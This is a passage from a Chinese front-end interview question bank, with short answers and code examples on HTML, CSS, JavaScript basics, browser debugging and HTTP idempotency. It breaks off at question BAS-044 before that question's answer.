# 前端面试题库：基础速答 200 题

本文件是"一题一考点"的基础速答题库，专门收录 01~09 专题未展开细讲的高频基础点：HTML 文档常识、CSS 速记、JS 基础类型与常用 API、浏览器与调试技巧、HTTP 速答、工程与命令行。题目短、答案准，适合面试前最后一轮快速过题，与已有专题形成互补而不重复。

```mermaid
flowchart TD
    A[基础速答题库<br/>BAS-001 ~ BAS-200] --> B[HTML 与文档基础<br/>BAS-001 ~ BAS-010]
    A --> C[CSS 速答<br/>BAS-011 ~ BAS-018]
    A --> D[JavaScript 基础<br/>BAS-019 ~ BAS-034]
    A --> E[浏览器与调试<br/>BAS-035 ~ BAS-042]
    A --> F[HTTP 与网络<br/>BAS-043 ~ BAS-045]
    A --> G[工程与命令行<br/>BAS-046 ~ BAS-050]
    A --> H[HTML 补充<br/>BAS-051 ~ BAS-061]
    A --> I[CSS 补充<br/>BAS-062 ~ BAS-080]
    A --> J[JS 语法补充<br/>BAS-081 ~ BAS-094]
    A --> K[DOM 与事件补充<br/>BAS-095 ~ BAS-104]
    A --> L[网络与浏览器补充<br/>BAS-105 ~ BAS-111]
    A --> M[TypeScript 与工程补充<br/>BAS-112 ~ BAS-120]
    A --> N[综合速答<br/>BAS-121 ~ BAS-125]
    A --> O[深入 JS 语义<br/>BAS-126 ~ BAS-140]
    A --> P[异步与事件循环补充<br/>BAS-141 ~ BAS-150]
    A --> Q[CSS 进阶速答<br/>BAS-151 ~ BAS-162]
    A --> R[HTTP 与安全速答补充<br/>BAS-163 ~ BAS-172]
    A --> S[浏览器与渲染补充<br/>BAS-173 ~ BAS-180]
    A --> T[Node 与 CLI 基础<br/>BAS-181 ~ BAS-188]
    A --> U[工具与规范速答<br/>BAS-189 ~ BAS-195]
    A --> V[综合辨析<br/>BAS-196 ~ BAS-200]
```

## 目录

### 一、HTML 与文档基础（BAS-001 ~ BAS-010）
### 二、CSS 速答（BAS-011 ~ BAS-018）
### 三、JavaScript 基础（BAS-019 ~ BAS-034）
### 四、浏览器与调试（BAS-035 ~ BAS-042）
### 五、HTTP 与网络速答（BAS-043 ~ BAS-045）
### 六、工程与命令行（BAS-046 ~ BAS-050）
### 七、HTML 补充（BAS-051 ~ BAS-061）
### 八、CSS 补充·布局与交互（BAS-062 ~ BAS-070）
### 九、CSS 补充·视觉与排版（BAS-071 ~ BAS-080）
### 十、JavaScript 语法补充（BAS-081 ~ BAS-094）
### 十一、DOM 与事件补充（BAS-095 ~ BAS-104）
### 十二、网络与浏览器补充（BAS-105 ~ BAS-111）
### 十三、TypeScript 与工程基础补充（BAS-112 ~ BAS-120）
### 十四、综合速答（BAS-121 ~ BAS-125）
### 十五、深入 JS 语义（BAS-126 ~ BAS-140）
### 十六、异步与事件循环补充（BAS-141 ~ BAS-150）
### 十七、CSS 进阶速答（BAS-151 ~ BAS-162）
### 十八、HTTP 与安全速答补充（BAS-163 ~ BAS-172）
### 十九、浏览器与渲染补充（BAS-173 ~ BAS-180）
### 二十、Node 与 CLI 基础（BAS-181 ~ BAS-188）
### 二十一、工具与规范速答（BAS-189 ~ BAS-195）
### 二十二、综合辨析（BAS-196 ~ BAS-200）

## 一、HTML 与文档基础

### BAS-001：DOCTYPE 的作用是什么？standards 模式和 quirks 模式有什么区别？
**答**：
- `<!DOCTYPE html>` 告诉浏览器用标准模式渲染；声明缺失或写错会退回 quirks 怪异模式。
- quirks 模式下：盒模型退化为 IE 模型（width 包含 padding 和 border）、行内元素宽高部分生效、图片底部出现空隙、部分百分比高度行为异常。
- 现代页面必须以 `<!DOCTYPE html>` 开头，它不需要区分 HTML4/5，写任何合法 DOCTYPE 都会进入标准模式。

```html
<!DOCTYPE html>
<!-- 标准模式：width:100px + padding:10px + border:1px = 实际占宽 122px -->
<html>
  <head><meta charset="utf-8"></head>
  <body>
    <!-- 若删掉上面的 DOCTYPE 进入 quirks 模式：
         同样的样式总宽变为 100px，内容区被挤压，布局整体与标准模式不一致 -->
    <div style="width:100px;padding:10px;border:1px solid #000;">122px or 100px</div>
  </body>
</html>
```

### BAS-002：行内元素、块级元素、行内块元素有什么区别？
**答**：
- 块级：独占一行、可设宽高、默认宽度撑满父容器，如 div、p、h1、ul。
- 行内：不换行、宽高无效、垂直方向的 padding/margin 不影响布局，如 span、a、strong。
- 行内块：不换行但可设宽高，img、input、button 默认即表现为行内块；三者可用 display 互相转换。

```css
span { background: #ffe; }        /* 行内：width/height 无效 */
.inline-block {
  display: inline-block;          /* 行内块：同行排列但宽高生效 */
  width: 100px; height: 40px;
}
.block {
  display: block;                 /* 块级：独占一行 */
  width: 100px;
}
```

### BAS-003：href 和 src 有什么区别？
**答**：
- href 表示"关联引用"：资源与文档并行加载，不会替换当前元素内容，用于 a、link。
- src 表示"嵌入来源"：资源下载后嵌入替换当前元素内容，如 img、script、iframe。
- 经典差异：`<link href>` 不阻塞 HTML 解析（只阻塞渲染）；`<script src>` 同步脚本会暂停解析等它下载执行完。

```html
<link href="style.css" rel="stylesheet" />
<!-- href：并行下载，不阻塞解析继续向下 -->
<script src="app.js"></script>
<!-- src：同步脚本会暂停 HTML 解析，直到下载并执行完成 -->
<img src="logo.png" alt="logo" />
<!-- src：图片内容被下载后嵌入元素中展示 -->
```

### BAS-004：defer 和 async 有什么区别？
**答**：
- 共同点：都让外部 script 异步下载，不阻塞 HTML 解析。
- async：下载完立即执行，多个脚本执行顺序不保证，适合统计、埋点等独立脚本。
- defer：下载完后按出现顺序、在 DOMContentLoaded 之前执行，适合依赖 DOM 的主逻辑。
- 动态创建的 script 默认行为等同 async，需要顺序时设 `script.async = false`。

```html
<script async src="analytics.js"></script>
<!-- async：下载完立即执行，与其他脚本的相对顺序不保证 -->
<script defer src="vendor.js"></script>
<script defer src="app.js"></script>
<!-- defer：严格按出现顺序执行，且都早于 DOMContentLoaded 事件 -->
```

### BAS-005：常用的 meta 标签有哪些？分别起什么作用？
**答**：
- `<meta charset="utf-8">`：声明字符编码，必须放在 head 最前面，防止乱码。
- `<meta name="viewport">`：控制移动端布局视口，`viewport-fit=cover` 兼容刘海屏。
- `<meta name="description">`：SEO 摘要，搜索结果里展示。
- `<meta http-equiv="Content-Security-Policy">`：无后端权限时用 meta 配置 CSP。

```html
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
<meta name="description" content="页面摘要，搜索引擎会展示这段文案" />
<meta name="format-detection" content="telephone=no" />
<!-- iOS 上禁止把长数字自动识别成电话拨号链接 -->
<meta http-equiv="Content-Security-Policy" content="default-src 'self'" />
```

### BAS-006：语义化的好处，用一句话怎么说？
**答**：
- 一句话版本：让"结构即含义"——对机器（搜索引擎、读屏器）可理解，对人（开发者）可维护。
- 展开点：SEO 权重更高、无障碍支持更好、去掉 CSS 后结构依然清晰、团队协作成本更低。
- 注意别只背"利于 SEO"，能说出可访问性与可维护性才是加分项。

```html
<header>站点标题</header>
<nav><a href="/">首页</a> <a href="/list">列表</a></nav>
<main>
  <article>
    <h1>文章标题</h1>
    <p>正文内容，读屏软件与爬虫都能理解主次关系</p>
  </article>
  <aside>相关推荐</aside>
</main>
<footer>版权信息</footer>
```

### BAS-007：hidden 属性和 display: none 有什么区别？
**答**：
- 效果相同：都不可见且不占空间，但 hidden 的本质是 UA 样式 `[hidden] { display: none }`，特异性很低。
- 经典坑：元素自己写了 `display: flex` 时，hidden 属性会被覆盖而失效。
- 工程建议：组件库统一显式兜底 `.x[hidden] { display: none !important; }`，业务上显隐控制尽量走 class 或 v-show。

```css
.card { display: flex; }          /* 没有下一行兜底时，hidden 属性会失效 */
.card[hidden] { display: none; }  /* 显式兜底，保证 hidden 永远生效 */
```

### BAS-008：jpg、png、gif、webp、svg 分别适合什么图片？
**答**：
- jpg：有损压缩、不支持透明，适合照片、banner 等色彩丰富的大图。
- png：无损 + 透明通道，适合图标、截图、需要透明的素材。
- gif：仅 256 色，适合简单帧动画，现在多被 webp/apng 或视频替代。
- webp/avif：有损无损都支持，比 jpg 小 25%~50%，现代浏览器优先使用。
- svg：矢量格式，无限缩放不失真，可用 CSS 改色，适合图标与插画。

```html
<picture>
  <source srcset="hero.avif" type="image/avif" />
  <source srcset="hero.webp" type="image/webp" />
  <img src="hero.jpg" alt="首屏大图" />
  <!-- 浏览器从上到下选第一个支持的格式，jpg 兜底 -->
</picture>
```

### BAS-009：img 的 alt 和 title 有什么区别？loading="lazy" 是什么？
**答**：
- alt：图片加载失败或读屏场景下的替代文本，是可访问性与 SEO 的必需属性。
- title：鼠标悬停时的提示文案，纯增强性质。
- `loading="lazy"`：原生懒加载，接近视口时才发起请求；首屏大图不要加，否则拖慢 LCP。

```html
<img
  src="chart.png"
  alt="2026 年各季度营收柱状图"
  title="点击查看大图"
  loading="lazy"
  decoding="async" />
```

### BAS-010：如何阻止表单的默认提交行为？
**答**：
- form 内的按钮默认触发同步提交导致整页刷新，需要 `event.preventDefault()` 阻止。
- 应监听 form 的 submit 事件而不是按钮 click，这样回车提交也能覆盖到。
- 纯操作型按钮记得写 `<button type="button">`，避免误触发提交。

```javascript
document.querySelector('#login-form').addEventListener('submit', async (event) => {
  event.preventDefault(); // 阻止整页刷新式的同步提交
  const data = Object.fromEntries(new FormData(event.target));
  await fetch('/api/login', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(data),
  });
});
```

## 二、CSS 速答

### BAS-011：CSS 有哪几种引入方式？link 和 @import 的区别是什么？
**答**：
- 三种方式：外链 `<link>`、内联 `<style>`、行内 `style=""` 属性（行内优先级最高，仅次于 !important）。
- link 是 HTML 标签，CSS 并行下载，还可以被 JS 动态增删实现主题切换。
- @import 是 CSS 语法，必须等当前 CSS 下载解析完才发起下一个请求，串行阻塞、可能引起 FOUC，工程上一律用 link。

```html
<link rel="stylesheet" href="/main.css" />
<!-- link：HTML 标签，并行下载，JS 可增删切换主题 -->

<style>
  /* 内联 style 标签：适合放首屏关键 CSS */
  .hero { min-height: 100vh; }
</style>

<!-- 不推荐在 main.css 里写 @import url('./theme.css')：
     theme.css 要等 main.css 下载解析后才发起请求，串行阻塞 -->
```

### BAS-012：px、em、rem、vw、vh 分别是什么？怎么选？
**答**：
- px：固定像素，不随用户字号设置缩放。
- em：相对当前元素（继承）的 font-size，嵌套会复合放大，适合描述"相对当前字号"的间距。
- rem：相对根元素 font-size，整体字号与间距统一缩放的首选。
- vw/vh：视口宽/高的 1%；移动端 100vh 受地址栏影响，可用 svh/dvh 精确控制。

```css
html    { font-size: 16px; }
.title  { font-size: 1.5rem; }   /* 24px，随根字号整体缩放 */
.list   { font-size: 1.2em;  }   /* 相对父级字号，嵌套会叠加 */
.hero   { height: 100dvh;    }   /* 动态视口高度，兼容地址栏与软键盘 */
.sidebar{ width: 20vw;       }   /* 视口宽度的 20% */
```

### BAS-013：display 的常用值有哪些？
**答**：
- 基础三类：block / inline / inline-block。
- 布局容器：flex / grid（以及行内版 inline-flex / inline-grid）。
- none：不渲染不占空间，区别于 visibility: hidden 占空间不可见。
- 进阶：contents 让盒子自身消失、子元素直接参与父级布局；flow-root 用于创建 BFC 清除浮动。

```css
.nav    { display: flex; gap: 12px; }
.grid   { display: grid; grid-template-columns: repeat(3, 1fr); }
.badge  { display: inline-block; padding: 2px 8px; }
.modal  { display: none; }        /* 隐藏且不占空间 */
.helper { display: flow-root; }   /* 创建 BFC，解决子元素浮动塌陷 */
```

### BAS-014：position 的常用值有哪些？
**答**：
- static：默认值，不参与定位。
- relative：相对自身原位偏移，同时是 absolute 子元素的包含块。
- absolute：相对最近的非 static 祖先定位，脱离文档流。
- fixed：相对视口定位；父级有 transform/filter 时会改为相对该祖先（高频坑）。
- sticky：滚动到阈值前是 relative、达到阈值后吸顶；需要指定 top，且祖先不能有 overflow: hidden。

```css
.tip    { position: relative; top: 4px; }               /* 原位偏移 */
.dialog { position: absolute; inset: 0; margin: auto; } /* 相对定位祖先居中 */
.toast  { position: fixed; top: 20px; right: 20px; }    /* 相对视口 */
.header { position: sticky; top: 0; }                   /* 滚动吸顶 */
```

### BAS-015：flex: 1 具体是什么含义？
**答**：
- 它是 `flex-grow: 1; flex-shrink: 1; flex-basis: 0%` 的缩写。
- grow=1 按比例分配剩余空间；shrink=1 允许在空间不足时被压缩；basis=0 表示自身不占基准宽度，完全按比例分。
- 对比：`flex: auto` 是 1 1 auto（先按内容占位再分剩余），`flex: none` 是 0 0 auto（固定不缩放）。

```css
.sidebar { flex: none; width: 200px; } /* 固定侧栏，不放大也不压缩 */
.main    { flex: 1;  }  /* 等价 flex-grow:1 flex-shrink:1 flex-basis:0% */
/* 两个 flex:1 的区域会严格平分剩余空间，与内容长短无关 */
```

### BAS-016：选择器优先级怎么快速计算？
**答**：
- 按（内联, id, class/伪类/属性, 元素/伪元素）四列比较，先比 id 列，列相同才往右比。
- !important 直接胜出（同为 important 时再比优先级）；继承而来的样式没有优先级可言。
- 助记：行内 1000 > id 100 > class 10 > 标签 1（数值记法只是助记，不是真实算法）。

```css
#nav .item    { color: red;   }  /* id 1 + class 1 */
div#nav .item { color: blue;  }  /* id 1 + class 1 + 元素 1，胜过上一条 */
.nav.item     { color: green; }  /* class 2 但 id 列为 0，输给上面两条 */
```

### BAS-017：让元素水平垂直居中，最常用的一行代码是什么？
**答**：
- 首选 flex：父元素 `display: flex; justify-content: center; align-items: center;`。
- 绝对定位且不知道宽高：`position: absolute; inset: 0; margin: auto;`，或 `translate(-50%, -50%)`。
- 单行文本垂直居中：line-height 等于容器高度，最省事。

```css
.parent {
  display: flex;
  justify-content: center; /* 水平居中 */
  align-items: center;     /* 垂直居中 */
}
/* 绝对定位版：不知道宽高也能居中 */
.child-abs {
  position: absolute; inset: 0; margin: auto;
  width: max-content; height: max-content;
}
```

### BAS-018：哪些 CSS 属性只触发合成、动画性能最好？
**答**：
- transform 和 opacity 只参与合成阶段，不触发重排重绘，是动画属性首选。
- top/left/width/height 每帧触发重排，color/background 触发重绘，代价都更高。
- 代价排序：重排 > 重绘 > 合成；高频动画还要避免"读布局写样式"交替造成强制同步布局。

```css
.drawer {
  transform: translateX(-100%); /* 收起状态 */
  transition: transform 0.3s;   /* 只触发合成 */
}
.drawer.open { transform: translateX(0); }
/* 反例：把 transform 换成 left 动画，每帧重排，掉帧明显 */
```

## 三、JavaScript 基础

判断类型是基础题里最容易踩坑的考点，先记一张决策图。

```mermaid
flowchart TD
    A[需要判断一个值的类型] --> B{怀疑是原始类型吗}
    B -->|是| C[typeof 即可<br/>number string boolean 等]
    C --> D{值可能是 null 吗}
    D -->|是| E[typeof null 返回 object<br/>改用全等判断]
    B -->|否| F{是数组吗}
    F -->|是| G[Array.isArray]
    F -->|其他引用类型| H[Object.prototype.toString.call<br/>最精确的通用方案]
    A --> I{关心某个类的原型链吗}
    I -->|是| J[instanceof 检查原型链]
```

### BAS-019：JS 有哪七种基本类型？typeof 有什么陷阱？
**答**：
- 七种原始类型：string、number、bigint、boolean、undefined、symbol、null，其余都是 object。
- 陷阱一：`typeof null === 'object'`，历史遗留 bug；陷阱二：`typeof function(){}` 返回 'function' 而非 'object'。
- typeof 区分不了数组和普通对象，要用 Array.isArray 或 Object.prototype.toString.call。

```javascript
typeof 1n === 'bigint';            // true
typeof Symbol() === 'symbol';      // true
typeof null === 'object';          // 历史遗留 bug
typeof [] === 'object';            // 数组和对象无法区分
Array.isArray([]);                 // true，判断数组的正确姿势
Object.prototype.toString.call(new Date()); // '[object Date]'
```

### BAS-020：typeof 和 instanceof 有什么区别？
**答**：
- typeof 返回类型字符串，用于原始类型与函数，写法简单但不精确。
- instanceof 检查构造函数的 prototype 是否在对象原型链上，只能用于对象/函数，跨 iframe 会失效（原型链不同）。
- 终极精确方案：`Object.prototype.toString.call(x)`。

```javascript
typeof 'a';                        // 'string'
'a' instanceof String;             // false，原始值不是对象
new String('a') instanceof String; // true
[] instanceof Object;              // true，原型链上能找到 Object.prototype
[] instanceof Array;               // true
```

### BAS-021：null 和 undefined 有什么区别？
**答**：
- undefined：变量声明未赋值、函数缺参、对象缺属性——"系统层面没值"。
- null：开发者主动赋的空值，语义是"这里本应有值，现在置空"。
- `null == undefined` 为 true，`null === undefined` 为 false；`typeof null` 是 'object'。

```javascript
let a;
console.log(a);                  // undefined，声明未赋值
const obj = { name: null };      // 主动表示"置空"
console.log(null == undefined);  // true
console.log(null === undefined); // false
```

### BAS-022：NaN 是什么？为什么需要 Number.isNaN？
**答**：
- NaN 是非法数值运算的结果，如 `Number('abc')`、`0/0`；它与任何值都不相等，包括自身。
- 全局 `isNaN` 会先把参数转数字，`isNaN('abc')` 也返回 true，存在误判。
- `Number.isNaN` 不做转换，只有参数真的是 NaN 才返回 true；也可用 `Object.is(x, NaN)`。

```javascript
Number('abc');               // NaN
NaN === NaN;                 // false，NaN 不等于任何值
isNaN('abc');                // true，'abc' 先被转成了 NaN
Number.isNaN('abc');         // false，字符串本身不是 NaN
Number.isNaN(Number('abc')); // true
```

### BAS-023：== 和 === 的区别？为什么推荐 ===？
**答**：
- === 严格相等：类型不同直接 false，不做隐式转换。
- == 宽松相等：两边转成数字再比较，规则复杂，如 `0 == ''`、`'1' == true` 都是 true。
- 唯一推荐用 == 的场景：`x == null` 同时判 undefined 和 null，其余一律 ===。

```javascript
0 == '';        // true，'' 转成 0
'1' == true;    // true，两边都转成数字 1
null == 0;      // false，null 只与 undefined 宽松相等
0 === '';       // false，类型不同直接不等
if (x == null) {} // 等价于 x === undefined || x === null
```

### BAS-024：var、let、const 有什么区别？
**答**：
- var：函数作用域、变量提升（声明前访问是 undefined）、可重复声明。
- let/const：块级作用域、暂时性死区（声明前访问直接报 ReferenceError）、不可重复声明。
- const 锁的是"绑定不可变"，对象内容仍可修改；规范：默认 const，需要重新赋值才 let，禁用 var。

```javascript
console.log(x); // undefined，var 提升且未报错
var x = 1;
console.log(y); // ReferenceError，暂时性死区
let y = 2;
const user = { name: 'A' };
user.name = 'B';  // 合法，const 锁的是绑定不是内容
// user = {};     // TypeError，绑定不可重新赋值
```

### BAS-025：箭头函数和普通函数有什么区别？
**答**：
- this：箭头函数没有自己的 this，沿用定义处的词法 this，call/apply/bind 都改不动。
- 没有 arguments 对象、没有 prototype、不能被 new 调用。
- 适用：回调中需要继承外层 this；不适用：对象方法、原型方法、DOM 事件处理（需要拿到元素自身的 this）。

```javascript
const timer = {
  seconds: 0,
  start() {
    // 箭头函数继承 start 的 this，seconds 正常累加
    setInterval(() => { this.seconds++; }, 1000);
  },
  // 反例：对象方法用箭头函数，this 指向外层而不是 timer
  reset: () => { this.seconds = 0; },
};
timer.start();
```

### BAS-026：模板字符串和标签模板是什么？
**答**：
- 模板字符串用反引号包裹：支持换行、`${}` 内可写任意表达式。
- 标签模板：函数名直接跟在模板字符串前，第一个参数是字符串片段数组，后续参数是插值结果。
- styled-components、i18n 等库的底层就是标签模板。

```javascript
const name = 'World';
const msg = `Hello, ${name}
换行不需要拼接。`;

function highlight(strings, ...values) {
  return strings.reduce((acc, s, i) =>
    acc + s + (values[i] ? `<em>${values[i]}</em>` : ''), '');
}
highlight`你好, ${name}`; // '你好, <em>World</em>'
```

### BAS-027：map、filter、reduce 有什么区别？
**答**：
- map：一一映射，返回等长新数组；filter：条件筛选，返回子集；reduce：把数组归约为任意值（数字、对象、数组）。
- 三者都不修改原数组；map 和 filter 都可以用 reduce 实现。
- 常见错误：map 里忘写 return 得到一堆 undefined；不需要新数组时该用 forEach 而不是 map。

```javascript
const nums = [1, 2, 3, 4];
nums.map((n) => n * 2);              // [2, 4, 6, 8] 等长映射
nums.filter((n) => n % 2 === 0);     // [2, 4] 子集
nums.reduce((sum, n) => sum + n, 0); // 10 归约
nums.reduce(
  (acc, n) => { acc[n % 2 ? 'odd' : 'even'].push(n); return acc; },
  { odd: [], even: [] },             // reduce 还能归约出对象
);
```

### BAS-028：some、every、find、findIndex、includes 分别做什么？
**答**：
- some：任一元素满足返回 true；every：全部满足才 true；都会短路遍历。
- find/findIndex：返回第一个满足条件的元素/下标，找不到是 undefined/-1。
- includes 判断是否包含，且能正确处理 NaN（indexOf 不行）。

```javascript
const users = [{ age: 15 }, { age: 30 }];
users.some((u) => u.age >= 18);      // true，存在成年人
users.every((u) => u.age >= 18);     // false
users.find((u) => u.age >= 18);      // { age: 30 }
users.findIndex((u) => u.age >= 18); // 1
[NaN].includes(NaN);                 // true，而 indexOf(NaN) 是 -1
```

### BAS-029：字符串常用方法有哪些？
**答**：
- 截取与拆分：slice、substring、split、repeat、padStart/padEnd。
- 查找与判断：indexOf、includes、startsWith、endsWith、charAt、at。
- 变形：trim、toUpperCase/toLowerCase、replace/replaceAll、match。字符串不可变，所有方法都返回新字符串。

```javascript
'5'.padStart(2, '0');        // '05'，补零
'a,b,c'.split(',');          // ['a', 'b', 'c']
'hello'.slice(1, 3);         // 'el'
'a-b'.replaceAll('-', '_');  // 'a_b'
'Hello'.at(-1);              // 'o'，支持负索引
' hi '.trim();               // 'hi'
```

### BAS-030：Object 有哪些常用静态方法？
**答**：
- keys/values/entries：拿键、值、键值对；Object.fromEntries 与 entries 互转。
- assign：浅合并对象；freeze：浅冻结（第一层不可改，嵌套对象仍可改）。
- hasOwn：安全判断自有属性，是 obj.hasOwnProperty 的推荐替代。

```javascript
const obj = { a: 1, b: 2 };
Object.keys(obj);                  // ['a', 'b']
Object.entries(obj);               // [['a', 1], ['b', 2]]
Object.fromEntries([['c', 3]]);    // { c: 3 }
Object.assign({}, obj, { b: 9 });  // { a: 1, b: 9 }，浅合并
Object.hasOwn(obj, 'a');           // true
```

### BAS-031：用 Date 处理时间时，时区要注意什么？
**答**：
- `new Date('2026-01-01')`（ISO 日期）按 UTC 零点解析；`new Date('2026/01/01')` 按本地时区解析，在东八区两者相差 8 小时。
- getHours 是本地时区，getUTCHours 是 UTC；展示前必须明确数据是本地时间还是 UTC。
- 跨端传输用时间戳或 ISO 字符串，展示交给 dayjs 等库，禁止手写字符串拼日期。

```javascript
new Date('2026-01-01').getHours();    // 8：UTC 零点在东八区是本地 8 点
new Date('2026/01/01').getHours();    // 0：按本地时区解析
new Date('2026-01-01').toISOString(); // '2026-01-01T00:00:00.000Z'
Date.now();                           // 时间戳与时区无关，传输首选
```

### BAS-032：JSON.stringify 有哪些陷阱？
**答**：
- undefined、函数、Symbol 属性会被静默丢弃（数组中变 null）；NaN/Infinity 变 null。
- Date 对象会转成 ISO 字符串；循环引用直接抛 TypeError；BigInt 也抛 TypeError。
- 对象定义了 toJSON 会先被调用；用 JSON 做深拷贝会丢失 undefined 和函数，现代项目优先 structuredClone。

```javascript
JSON.stringify({ a: undefined, b: () => 1, c: NaN });
// '{"c":null}'：a、b 被丢弃，NaN 变 null
JSON.stringify(new Date('2026-01-01')); // '"2026-01-01T00:00:00.000Z"'
const o = {}; o.self = o;
JSON.stringify(o); // TypeError: Converting circular structure to JSON
```

### BAS-033：事件冒泡和捕获是怎么回事？
**答**：
- 完整事件流分三阶段：捕获（window 往下到目标）、目标阶段、冒泡（目标往上到 window）。
- addEventListener 第三个参数传 true 表示在捕获阶段触发，默认 false 在冒泡阶段。
- `event.stopPropagation()` 阻止继续传播；`event.preventDefault()` 只取消默认行为，不影响传播。

```html
<div id="outer">
  <button id="inner">点我</button>
</div>
<script>
  // 捕获阶段先触发：document -> outer -> inner
  document.getElementById('outer').addEventListener('click', () => console.log('outer 捕获'), true);
  document.getElementById('inner').addEventListener('click', (e) => {
    console.log('inner 冒泡');
    e.stopPropagation(); // 阻止冒泡到 outer
  });
</script>
```

```mermaid
flowchart LR
    A[window 捕获] --> B[document 捕获]
    B --> C[父元素捕获]
    C --> D[目标元素<br/>按注册顺序执行]
    D --> E[父元素冒泡]
    E --> F[document 冒泡]
    F --> G[window 冒泡]
```

### BAS-034：鼠标事件和触摸事件有什么区别？
**答**：
- 鼠标：click/dblclick/mousemove/mouseenter/mouseleave；触摸：touchstart/touchmove/touchend。
- 触摸事件 `e.touches` 是当前屏幕所有触点集合，支持多点操作；鼠标只有单点。
- 触摸结束后浏览器会补发合成 click；在 touchstart 里调用 preventDefault 会阻止后续 click 与滚动，滚动场景应加 passive: true。

```javascript
el.addEventListener('touchstart', (e) => {
  const { clientX, clientY } = e.touches[0]; // 第一个触点坐标
}, { passive: true }); // 声明不会 preventDefault，滚动不被阻塞
el.addEventListener('click', (e) => console.log(e.clientX, e.clientY));
```

## 四、浏览器与调试

### BAS-035：浏览器是多进程架构吗？有哪些进程？
**答**：
- 现代浏览器是多进程的：浏览器主进程、渲染进程、GPU 进程、网络进程、插件进程。
- 站点隔离（Site Isolation）下每个跨站站点单独一个渲染进程，一个标签页崩溃不影响其他标签页。
- 渲染进程内部是多线程：JS 引擎线程与渲染线程互斥，所以长 JS 任务会卡住页面。

```javascript
// DevTools 控制台可以验证渲染进程的启动时间
console.log(performance.timeOrigin); // 当前页面所在渲染进程的起始时间
// 浏览器任务管理器（菜单：更多工具 - 任务管理器）能看到每个标签页对应的独立渲染进程
```

### BAS-036：encodeURI 和 encodeURIComponent 有什么区别？
**答**：
- encodeURI 编码整个 URL，保留结构字符（`:` `/` `?` `#` `&` `=`），只转义中文、空格等。
- encodeURIComponent 编码单个参数值，结构字符也一并转义，拼接 query 参数必须用它。
- 对应解码是 decodeURI / decodeURIComponent；表单编码里 `+` 代表空格，服务端要做转换。

```javascript
encodeURI('https://a.com/搜索?q=前端');   // 保留 :// ? = 等 URL 结构字符
encodeURIComponent('a=1&b=前端');         // 参数值里的 = 和 & 也被转义
const url = 'https://a.com/search?q=' + encodeURIComponent('前端 & 面试');
```

### BAS-037：如何用 location 或 URL 解析当前地址？
**答**：
- location.href 是完整地址（可赋值跳转），host 含端口、hostname 不含。
- search 是 `?` 后的 query 字符串，hash 是 `#` 后的部分。
- 现代解析推荐 URL + URLSearchParams，不用手写正则拆 query。

```javascript
const u = new URL('https://a.com:8080/list?kw=vue&page=2#top');
u.hostname;                // 'a.com'
u.port;                    // '8080'
u.searchParams.get('kw');  // 'vue'
u.searchParams.get('page');// '2'
u.hash;                    // '#top'
```

### BAS-038：console 有哪些实用的调试技巧？
**答**：
- log 之外：table（表格化数组对象）、group/groupEnd（分组折叠）、time/timeEnd（计时）、dir（查看对象属性）。
- 占位符：%s 字符串、%d 数字、%c 样式、%o 对象。
- 经典坑：console.log 引用类型显示的是最终状态，要看快照就断点或序列化后打印。

```javascript
console.table([{ id: 1, name: 'a' }, { id: 2, name: 'b' }]);
console.group('请求详情');
console.log('url', '/api/list');
console.time('fetch');
// await fetch('/api/list')
console.timeEnd('fetch');
console.groupEnd();
console.log('%c 重点数据', 'color:#fff;background:#f40;padding:2px 4px;');
console.log(JSON.parse(JSON.stringify(bigObj))); // 打印快照而非引用
```

### BAS-039：debugger 语句和断点怎么配合使用？
**答**：
- 代码里写 `debugger;`，DevTools 打开时执行到该行自动暂停，等于硬编码断点。
- Sources 面板行号右键可加条件断点（满足条件才停）和 Logpoint（只打日志不暂停）。
- 暂停时看 Scope 作用域、Watch 表达式、Call Stack 调用栈；上线前用构建配置移除 debugger。

```javascript
function avg(list) {
  const total = list.reduce((s, n) => s + n, 0);
  debugger; // DevTools 打开时在此暂停，检查 list 与 total
  return total / list.length;
}
```

### BAS-040：Chrome DevTools 常用面板分别做什么？
**答**：
- Elements：审查 DOM 与样式；Console：执行脚本、看日志报错。
- Sources：断点调试；Network：请求瀑布、耗时、载荷、过滤。
- Performance：火焰图定位卡顿；Memory：堆快照查泄漏；Application：Storage、Service Worker、Cookie；Lighthouse：性能评分。

```javascript
// Network 面板过滤框支持的常用语法（直接输入）：
// is:running        只看进行中的请求
// larger-than:50K   响应大于 50KB 的请求
// method:POST       按请求方法过滤
// status-code:4xx   按状态码过滤
console.log('以上关键字直接输入 Network 过滤框即可');
```

### BAS-041：setTimeout 和 setInterval 有哪些注意点？
**答**：
- 定时器不精确：delay 只是"最早执行时间"，主线程被占用时顺延；嵌套超过 5 层后最小间隔被强制为 4ms。
- setInterval 若回调执行时间超过间隔，会连续堆积执行，推荐用链式 setTimeout 替代。
- 组件卸载或页面离开时必须 clearTimeout/clearInterval，否则定时器泄漏、回调访问已销毁的组件。

```javascript
// 链式 setTimeout：上一次执行完成后才开始计时，天然防堆积
let timerId;
function poll() {
  fetch('/api/status')
    .then(() => { timerId = setTimeout(poll, 3000); })
    .catch(() => { timerId = setTimeout(poll, 10000); });
}
poll();
// 组件卸载时：clearTimeout(timerId)
```

### BAS-042：回调、Promise、async/await 是什么关系？
**答**：
- 回调是最原始的异步方案，多层嵌套形成回调地狱，错误只能在每层处理。
- Promise 用链式 then/catch 把异步扁平化，状态一旦改变不可逆。
- async/await 是 Promise 的语法糖：同步写法、try/catch 捕错，底层仍是微任务。

```javascript
// 回调风格：getUser(id, (err, user) => ...)
// Promise 链：
getUser(id)
  .then((user) => getOrders(user.id))
  .then((orders) => console.log(orders))
  .catch(handleError);
// async/await：
async function load(id) {
  try {
    const user = await getUser(id);
    return await getOrders(user.id);
  } catch (e) {
    handleError(e);
  }
}
```

## 五、HTTP 与网络速答

### BAS-043：HTTP 方法的幂等性怎么理解？
**答**：
- 幂等：同一请求执行一次和执行多次，服务器状态结果相同。
- GET/PUT/DELETE 幂等；POST 不幂等（每次都创建新资源）；PATCH 不保证幂等。
- 工程意义：幂等请求可以安全重试；POST 重试需要幂等键（Idempotency-Key）让服务端去重。

```javascript
// GET 超时后重试是安全的
const res = await fetch('/api/list');
// POST 创建订单不能盲目重试：带上幂等键，服务端按键去重
await fetch('/api/order', {
  method: 'POST',
  headers: { 'Idempotency-Key': crypto.randomUUID() },
  body: JSON.stringify({ sku: 'A001', num: 1 }),
});
```

### BAS-044：GET 和 POST 有什么区别？
**答**：
